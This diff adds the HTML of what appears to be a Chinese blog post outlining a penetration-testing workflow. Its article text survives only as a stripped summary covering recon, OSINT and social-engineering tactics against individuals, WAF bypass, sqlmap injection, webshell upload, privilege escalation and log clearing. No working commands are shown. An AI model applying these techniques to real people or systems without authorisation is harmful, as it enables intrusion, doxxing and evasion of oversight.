@@ -1,0 +1,761 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>渗透测试全流程 | CCB</title><meta name="keywords" content="渗透测试"><meta name="author" content="ccb"><meta name="copyright" content="ccb"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="渗透测试全流程"><meta name="application-name" content="渗透测试全流程"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="渗透测试全流程"><meta property="og:url" content="https://frankcao3.github.io/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/0.%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A8%E6%B5%81%E7%A8%8B%E6%80%BB%E7%BB%93"><meta property="og:site_name" content="CCB"><meta property="og:description" content="渗透测试全流程参考： https:&amp;#x2F;&amp;#x2F;www.freebuf.com&amp;#x2F;articles&amp;#x2F;web&amp;#x2F;290055.html https:&amp;#x2F;&amp;#x2F;www.freebuf.com&amp;#x2F;vuls&amp;#x2F;360173.html 从旁观者的角度了解整个WEB应用乃至整个目标的全貌，但是资产是收集不完的，可以边收集，边进行一定程"><meta property="og:locale" content="en"><meta property="og:image" content="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg"><meta property="article:author" content="ccb"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg"><meta name="description" content="渗透测试全流程参考： https:&amp;#x2F;&amp;#x2F;www.freebuf.com&amp;#x2F;articles&amp;#x2F;web&amp;#x2F;290055.html https:&amp;#x2F;&amp;#x2F;www.freebuf.com&amp;#x2F;vuls&amp;#x2F;360173.html 从旁观者的角度了解整个WEB应用乃至整个目标的全貌，但是资产是收集不完的，可以边收集，边进行一定程"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="https://frankcao3.github.io/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/0.%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A8%E6%B5%81%E7%A8%8B%E6%80%BB%E7%BB%93"><link rel="preconnect" href="//cdn.cbd.int"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.20/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  linkPageTop: undefined,
+  peoplecanvas: {"enable":true,"img":"https://upload-bbs.miyoushe.com/upload/2023/09/03/125766904/ee23df8517f3c3e3efc4145658269c06_5714860933110284659.png"},
+  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
+  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)欢迎肥来！"},
+  LA51: undefined,
+  greetingBox: undefined,
+  twikooEnvId: '',
+  commentBarrageConfig:undefined,
+  root: '/',
+  preloader: {"source":3},
+  friends_vue_info: undefined,
+  navMusic: true,
+  mainTone: undefined,
+  authorStatus: undefined,
+  algolia: undefined,
+  localSearch: undefined,
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
+  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    simplehomepage: true,
+    post: false
+  },
+  runtime: 'days',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: {"copy":true,"copyrightEbable":true,"limitCount":50,"languages":{"author":"Author: ccb","link":"Link: ","source":"Source: CCB","info":"Copyright is owned by the author. For commercial reprints, please contact the author for authorization. For non-commercial reprints, please indicate the source.","copySuccess":"Copy success, copy and reprint please mark the address of this article"}},
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"Traditional Chinese Activated Manually","cht_to_chs":"Simplified Chinese Activated Manually","day_to_night":"Dark Mode Activated Manually","night_to_day":"Light Mode Activated Manually","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
+      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isAnchor: false,
+  shortcutKey: undefined,
+  autoDarkmode: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  configTitle: 'CCB',
+  title: '渗透测试全流程',
+  postAI: '',
+  pageFillDescription: '渗透测试全流程, 信息收集, 1. 目标确认, 1.1 域名注册信息, 1.2 DNS信息查询, 1.3 测试域传送漏洞, 1.4 业务相关, 2. OSINT 公开情报收集, 2.1 社工技巧, 2.2 搜索引擎OSINT, 2.3 浏览器实用插件, 2.4 乌云和cnvd, 3. x3Dx3D打点x3Dx3D, 主动探测, 1. 主动扫描, 1.1 常见服务漏洞（x3Dx3Dnmapx3Dx3D）, 1.2 常见端口漏洞利用, 1.3 WAF 及 bypass, 1.4 目录、后台和敏感路径文件扫描, 2. 人工浏览\逐个请求burp, 3.自动化, 漏洞挖掘, 1. 漏洞扫描工具, 1.1 Nikto Web服务漏洞扫描器, 1.2 AWVS漏扫, 1.3 NESSUS, 1.4 Xray自动化的漏洞挖掘, 1.5 Fuzz, 2.挖掘漏洞, 2.1 SQL注入, 2.2 XSS, 漏洞利用getshgell, 后渗透（权限提升）, 清除痕迹, 撰写报告渗透测试全流程参考从旁观者的角度了解整个应用乃至整个目标的全貌但是资产是收集不完的可以边收集边进行一定程度的测试信息收集最小的粒度应是目录信息收集自带的一款工具很方便一款自动化做的非常好的工具信息收集全过程都能用上一款子域名收集工具收集接口非常多比自己收藏一大堆网址方便收集子域自动去重去无效并进行拓展子域名挖掘机和拉满线程去跑子域名的工具都是老朋友见面不用多说了一些信息收集的网站端同服扫描天眼查网络空间搜索引擎云悉资产搜集搜索引擎知道创宇眼电话帮搜狗号码通百度号码认证非好友情况如何查看空间房产登记信息查询站长之家在线工具查询所在位置云悉在线指纹识别平台指纹识别临时邮箱在线段同服旁站漏洞库目标确认域名注册信息通过如下步骤确认目标所有者信息目标域名主机名解析目标域名主机名的地址获取域名的详细解析过程后续用于字典制作和进一步收集目标信息的基础获取真实浏览器切换手机模式可能是真实公众号小程序中的资产也可能对应真实验证是否存在方法使用各种多地的服务查看对应地址是否唯一如果不唯一多半是使用了多地网站有方法试用进行检测如果返回域名解析对应多个那么多半是试用了方法在线工具查看是否存在可以参考以下站点绕过查找网站真实查询历史记录的历史解析域名域名的历史解析查看与域名绑定的历史记录可能会存在使用前的记录相关查询网站有非常牛逼的记录站还能分析内链之类找出可能的地址此外还会记录历史同样是个令站长十分蛋疼的历史记录网站记录了几年内的更改记录庞大的历史数据库可以查出几年内网站用过的机房信息等注意这个网站可以遍历记录和常见二级域名有些站长喜欢把邮箱服务也放在自己主机上侧面泄露了真实的地址通过这个网站可以进行检查查询子域名捷径去众测平台找官方发布过的注意有可能有些站长只给主站或流量大的子域名做了而很多子域名都是和主站在同一台服务器上或者段中这样可以通过子域名来辅助找到网站真实爆破子域名主动式子域名挖掘机字典要自己丰富在线子域名挖掘很好用速度快被动式搜索引擎拿子域名旁站同网站段可用搜索引擎语法查询子域名谷歌百度搜狗搜索微信文章雅虎等略有差异详细用法主域名搜索其主要域名下面的子域名搜索文本但不包括网页标题和链接搜索链接不包括文本和标题列出于目标地址有关的网页列出到链接到目标的网页清单使用去掉不想看的结果例如百度语法谷歌语法资产搜索旁站段特征资产相关或特征值关键字爆云悉在线资产平台查询啦一个不会存储你个人信息的搜索引擎证书查询域名备案对方服务器给自己发邮件暴露使用其他地区的服务器网站当地可能没做借助漏洞若存在漏洞服务器主动与我们发起请求连接我们也能获取目标站点真实例如命令执行反弹等信息查询目的注册者名称及邮箱再反查其他域名手机号座机号号地址在线信息查询工具搜索引擎站长之家天眼查国家企业信用信息系统备案查询测试域传送漏洞域传送是一种事务用于在主从服务器间复制记录虽然如今已经很少见主机会开启但是还是应该确认一下一旦存在域传送漏洞就意味着你获取了整个域下面所有的记录包含自动检测域传送漏洞还能爆破子域名功能比较多详见业务相关泄露仓库标题搜索含有关键字仓库描述搜索含有关键字文件搜素含有关键字数量大于的搜索关键字数量大于小于的搜索关键字数量大于的搜索关键字数量大于小于的搜索关键字指定仓库大于的搜索关键字发布时间大于的搜索关键字创建时间大于的搜索关键字用户名搜素明确仓库的搜索关键字在语言的代码中搜索关键字组合搜索用户名的标题含有的网盘泄露各种云网盘详见虫部落搜索敏感路径扫描公开情报收集社工技巧查看注册的网站知道账号去已注册的网站找回密码可以看到打码后的用户名邮箱真实姓名等信息如果运气好没准能从数据包或中找到未被打码的信息可以从这些方面判断用户是否注册过找回密码输入账号如果进入下一步了则该账号存在登录输入账号和密码如果提示密码错误则表示该用户已存在注册填写账号时一般网站会去检测该账号是否已存在如果已存在则会提示不可重复注册知道通过邮箱和号搜索支付宝淘宝账号等其他可能的常用平台去腾讯新浪微博搜索通过微信搜索查看空间相册地区星座生日昵称后续构建字典以及跨平台搜集通过说说留言日志找到其好友加钓鱼共同好友可能认识的人知道手机号搜索微信钉钉等社交账号在比较火的一些和网站上注册或忘记密码来判断是否注册过账号查询支付宝交易账号尝试输入常见姓氏获取名字转账到该手机号会提示输入姓氏验证通过对方的职业兴趣找到该领域知名度较高的社交网站反查根据在空间朋友圈等动态用百度识图识别照片在微博百度贴吧搜索相近关键字按地域年龄男女用户名等筛选留意社交动态发布时间线使用什么客户端还是浏览器针对客户端预先制定注意每一条链接图片视频链接可能包含用户图片可能包含水印可能会有定位和手机类型图片内容特征视频也有可能有水印暴露社交账号拍摄地点从最早发布的动态看起会有很大收获一般得到一个账号的密码就相当于得到了其他账号的密码一般人不同账号的用户名都是相同或相近的一般人的社交账号头像用的都是一样的尝试破解社保公积金账号身份号出生地生日星座派出所代码虫部落快搜之文件搜索群群文件贴吧论坛目标自用论坛等社交平台钓鱼和信息泄露爬邮箱等信息电子邮件伪造网络钓鱼下载恶意程序输入敏感信息大部分信息可以用来生成密码字典对人说服对方达成一致恐吓对方敏感词漏洞病毒权威机构名称钓鱼获取信息搜索引擎常用语法仅针对有效把网页中的正文内容中的某个字符作为搜索的条件把网页标题中的某个字符作为搜索的条件搜索搜索引擎里关于某些内容的缓存可能会在过期内容中发现有价值的信息指定一个格式类型的文件作为搜索对象搜索包含指定字符的在指定的域名站点搜索相关内容其他语法引号把关键字打上引号后把引号部分作为整体来搜索同时搜索两个或更多的关键字搜索某个网站的链接即返回所有和做了链接的查找指定站点的一些基本信息典型用法特定资产的万能密码也要积累管理后台地址管理后台后台管理登陆登录用户名密码系统账号管理后台后台管理登陆登录上传类漏洞地址注入页面批量注入工具结合搜索引擎编辑器页面目录遍历漏洞错误配置文件泄露数据库文件泄露日志文件泄露备份和历史文件泄露公开文件泄露邮箱信息邮件社工信息账号密码工号学号身份浏览器实用插件识别网站使用的中间件及其版本再去漏洞库和搜索引擎找公开披露的漏洞快捷切换代理识别开放端口主机服务等被动信息搜集综合插件很强大渗透便携版工具集成很多注意根据获得服务中间件信息编辑器版本数据库等去各大漏洞库搜索引擎找漏洞利用乌云和乌云库乌云镜像等公开漏洞库打点打点方法打点原理主动探测从管理员和用户的角度了解整个应用乃至整个目标的全貌主动探测会暴露以及留下日志信息所以要主动扫描常见服务漏洞功能包括脚本扫描隐蔽扫描端口扫描服务识别识别探测脚本主要分为以下几类在扫描时可根据需要设置类别这种方式进行比较笼统的扫描负责处理鉴权证书绕开鉴权的脚本在局域网内探查更多服务开启状况如等服务提供暴力破解方式针对常见的应用如等使用或选项扫描时候默认的脚本提供基本脚本扫描能力对网络进行更多的信息如枚举查询等用于进行拒绝服务攻击利用已知的漏洞入侵系统利用第三方的数据库或资源例如进行解析模糊测试的脚本发送异常的包到目标机探测出潜在漏洞入侵性的脚本此类脚本可能引发对方的的记录或屏蔽探测目标机是否感染了病毒开启了后门等信息此类与相反属于安全性脚本负责增强服务与版本扫描功能的脚本负责检查目标机是否有常见的漏洞如是否有负责处理鉴权证书绕开鉴权的脚本也可以作为检测部分应用弱口令在局域网内探查更多服务开启状况提供暴力破解的方式可对数据库等进行简单密码的暴力猜解或者默认的脚本扫描主要是搜集各种应用服务的信息收集到后可再针对具体服务进行攻击检查是否存在常见漏洞利用第三方的数据库或资源例如进行解析获取软件版本信息操作系统信息版本完整信息获取详细显示探测高速扫描系统和服务版本信息脚本扫描和路由跟踪外网扫描比较合适以上不准确扫描前号端口扫描个本地主机按的顺序扫描端口扫描前号端口指纹服务然后运行一个脚本扫描全部个端口指纹服务然后运行一个脚本扫描前号端口扫描所有个端口扫描所有个端口并获取服务指纹之后运行一些脚本隐蔽扫描是扫描是通过发送非常规的通信数据包进行探测扫描不会标记任何数据包目标主机相应端口关闭会响应一个数据包端口开启则不会响应任何信息端口开启所以扫描未返回任何数据包发送的数据包是扫描当我们使用扫描时可能会被目标主机的防火墙发现会阻止数据包这时我们使用扫描方式会有很好的穿透效果使用扫描不需要完成握手扫描是向目标端口发送一个包收到响应包则说明目标端口是开放的如果没有收到则说明是关闭的发送的数据包邮件服务端口开启所以返回数据包是扫描发送的数据包的和标记位置打开即标志为如果目标主机的和标记位是开放的则会响应一个标志包发送的数据包和标记位为目标主机的和标记位是开放的所以返回数据包并且可以发现目标主机的和标记位为常见端口漏洞利用快速扫描匿名暴力破解拒绝服务暴力破解弱口令暴力破解弱口令匿名访问注入心脏出血拒绝服务永恒之蓝匿名访问暴力破解暴力破解破解绕过提权放大镜输入法绕过用户永恒之蓝文件读取如果管理员不设置帐号本地会自动登录远程访问会提示配置错误默认账号参考未授权未授权反序列化开机自启文件夹写参考默认弱口令反序列参考后台未授权登录后可部署包服务有反序列化弱口令未授权反射未授权注入命令执行未授权命令执行其他及探测探测有两种脚本一种是一种是中的防火墙探测工具请求真实绕过部分部署架构的特性部分并不是直接串在目标站点线路上而是通过解析的形式部署此时可以先探测到目标站点的真实直接请求以此绕过的检测检测内容范围绕过性能限制检测特定内容前几或几十的内容然后在此特定内容段内填充物用数据放于物用数据后以此绕过检测协议盲区绕过根据自己的防御策略所支持的协议特性针对该协议内的请求进行检查但是存在一些协议检测或协议运行机制上的缺陷导致被绕过例如协议未覆盖协议解析不正确协议解析遗漏等检测规则绕过工程师规则编写经验规则覆盖面等问题来绕过检测例如利用对一些特殊字符处理的特性语法特性绕过文件包含绕过相对路径绝对路径绕过技术大小写转换编码编码混合编码使用注释双重编码通配符混淆垃圾字符换行未初始化的变量制表符和换行令牌破坏者其他格式的混淆目录后台和敏感路径文件扫描御剑目录土司专版笔记里有后台扫描图片属性地址暴露完善目录和账密字典方法基础字典包合并去重推荐工具白鹿社工字典密码字典实时丰富更新提取各种泄露数据中的各种类型的密码然后按出现频率排序比如键盘组合等等就能得到各种类型的密码字典人工浏览逐个请求非常重要有必要手动去浏览每个页面点击页面上每一个跳转这样在的里面就可以出现这些请求和响应图片后台地址图片后面的信息跳转参数奇怪的参数泄露邮箱等社工信息业务逻辑架构自动化自动化渗透测试框架待补充自动化信息收集效率较高从上多找一找也可以自己写漏洞挖掘漏洞扫描工具注意登录类网站扫描要带扫才能扫到网上总有最新破解版自动化漏扫框架功能丰富必备破解流程复杂但是真的好用综合型的应用安全漏洞扫描工具检查和比较擅长也是必备的渗透开始就挂着鼠标点到哪里扫到哪里联动和其他漏扫效果也不错服务漏洞扫描器利用选项来导出特定格式的扫描结果使扫描结果更容易阅读和分析使用方法升级更新插件查看插件扫描目标域名方式扫描并输出结果扫描目标地址加端口号扫描网站文件名批量扫描目标利用扫描开放端口的段并且结果输出并整理通过管道的方式用进行扫描利用代理进行扫描当一个网站存在多个端口时可以使用遍历所有网站进行扫描或一个对应多个网站交互形参数配置文件路径中文名为用户代理简称它是一个特殊字符串头使得服务器能够识别客户使用的操作系统及版本在中最好修改成别的浏览器设置在配置文件中找到进行设置逃避技术主要为了躲避检测告警此参数使用方式逃避方式共种随机编码自选路径过早结束的优先考虑长随机字符串参数欺骗使用作为命令的分隔符使用变化的使用路径分隔符漏扫这个没什么好说的破解版到处都是实时更新插件的漏扫很好用就是激活流程麻烦自动化的漏洞挖掘被动扫描配置博客园或者直接挂浏览器点到哪里扫到哪里各种漏扫联动可以发现应用程序中没有被引用但是确实是可以访问的页面是中专门用于此目的的工具也可以通过字典攻击来实施强制浏览通常是在参数和文件路径部分进行修改爆破注入等包含一些用于此目的的非常牛逼的字典挖掘漏洞注入初步测试见框就上加抓包爆破常用注入字典上注入六连查询是否存在注入点检测站点包含哪些数据库获取当前的数据库名获取指定数据库中的表名后接指定的数据库名称获取数据库表中的字段获取字段的数据内容注入注入步骤如下打开获取拦截信息然后右键保存文件到指定目录下运行并执行如下命令加载文件指定参数即拦截的请求中表单提交的用户名或密码等参数自动获取表单自动获取表单例如指定参数搜索例如重新扫描删除原先对该目标扫描的记录获取表名检测站点包含哪些数据库获取当前的数据库名检测当前用户判断站点的当前用户是否为数据库管理员默认确认不询问你是否输入后面跟参数搜索列表和或数据库名称线程线程最高设置为默认测试所有的和参数当的值大于等于的时候也会测试头的值当大于等于的时候也会测试和头的值最高为执行测试的风险默认为越高越慢但是越安全详细的等级只显示的回溯错误和关键消息显示信息和警告消息显示调试消息有效载荷注入显示请求显示响应头显示响应页面的内容查看权限防火墙绕过后接库中的文件方式提交数据采用多线程后接线程数使用欺骗自定义目标地址使用代理注入漏洞原理分析与挖掘方法知乎小结先知社区跨站点脚本速查表雨苁自动化工具自动化绕过生成漏洞利用常用的漏洞利用工具如下注入跨站脚本抓包改包工具工具抓包软件文件上传漏洞上传漏洞的话我们一般会上传一句话木马上去进而再获得传送门和一句话木马但是获得了后一般权限很低所以我们需要提权可以选择反弹一个类型的提权的使用生成一个后门木马也可以反弹一个类型的渗透测试神器的使用也可以和联动和联动也可以使用其他提权提权提权后渗透权限提升见权限提升的文章清除痕迹系统如果是系统可用中的命令清除痕迹如果远程登录过需要清除痕迹执行命令清除日志如果是应用找到日志文件删除系统如果是系统在获取权限后执行以下命令不会记录输入过的命令删除目录下的日志文件如果是应用找到日志文件删除撰写报告',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-10-06 17:09:05',
+  postMainColor: '',
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+
+          if (t === undefined) {
+            if (isLightMode) activateLightMode()
+            else if (isDarkMode) activateDarkMode()
+            else if (isNotSpecified || hasNoSupport) {
+              const now = new Date()
+              const hour = now.getHours()
+              const isNight = hour <= 6 || hour >= 18
+              isNight ? activateDarkMode() : activateLightMode()
+            }
+            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
+              if (saveToLocal.get('theme') === undefined) {
+                e.matches ? activateDarkMode() : activateLightMode()
+              }
+            })
+          } else if (t === 'light') activateLightMode()
+          else activateDarkMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.2.0"><link rel="alternate" href="/atom.xml" title="CCB" type="application/atom+xml">
+</head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://npm.elemecdn.com/anzhiyu-blog-static@1.0.4/img/avatar.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
+  endLoading: () => {
+    document.getElementById('loading-box').classList.add("loaded");
+  },
+  initLoading: () => {
+    document.getElementById('loading-box').classList.remove("loaded")
+  }
+}
+window.addEventListener('load',()=> { preloader.endLoading() })
+setTimeout(function(){preloader.endLoading();},10000)
+
+if (true) {
+  document.addEventListener('pjax:send', () => { preloader.initLoading() })
+  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><a id="site-name" href="/" accesskey="h"><div class="title">CCB</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><i class="anzhiyufont anzhiyu-icon-link faa-tada" style="font-size: 0.9em;"></i><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><i class="anzhiyufont anzhiyu-icon-artstation faa-tada" style="font-size: 0.9em;"></i><span> 朋友圈</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/comments/"><i class="anzhiyufont anzhiyu-icon-envelope faa-tada" style="font-size: 0.9em;"></i><span> 留言板</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><i class="anzhiyufont anzhiyu-icon-music faa-tada" style="font-size: 0.9em;"></i><span> 音乐馆</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/bangumis/"><i class="anzhiyufont anzhiyu-icon-bilibili faa-tada" style="font-size: 0.9em;"></i><span> 追番页</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/album/"><i class="anzhiyufont anzhiyu-icon-images faa-tada" style="font-size: 0.9em;"></i><span> 相册集</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/air-conditioner/"><i class="anzhiyufont anzhiyu-icon-fan faa-tada" style="font-size: 0.9em;"></i><span> 小空调</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/essay/"><i class="anzhiyufont anzhiyu-icon-lightbulb faa-tada" style="font-size: 0.9em;"></i><span> 闲言碎语</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><i class="anzhiyufont anzhiyu-icon-shoe-prints1 faa-tada" style="font-size: 0.9em;"></i><span> 随便逛逛</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="微信" src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> Newest Comments</span></div><div class="aside-list"><span>loading...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/DVWA%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">DVWA靶场<sup>10</sup></a><a href="/tags/%E5%AE%9E%E8%AE%AD-%E7%BD%91%E7%BB%9C%E5%BB%BA%E8%AE%BE%E9%83%A8%E5%88%86/" style="font-size: 1.05rem;">实训-网络建设部分<sup>7</sup></a><a href="/tags/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/" style="font-size: 1.05rem;">搭建博客<sup>1</sup></a><a href="/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/" style="font-size: 1.05rem;">机器学习<sup>1</sup></a><a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="font-size: 1.05rem;">渗透测试<sup>15</sup></a><a href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/" style="font-size: 1.05rem;">计算机基础<sup>5</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont 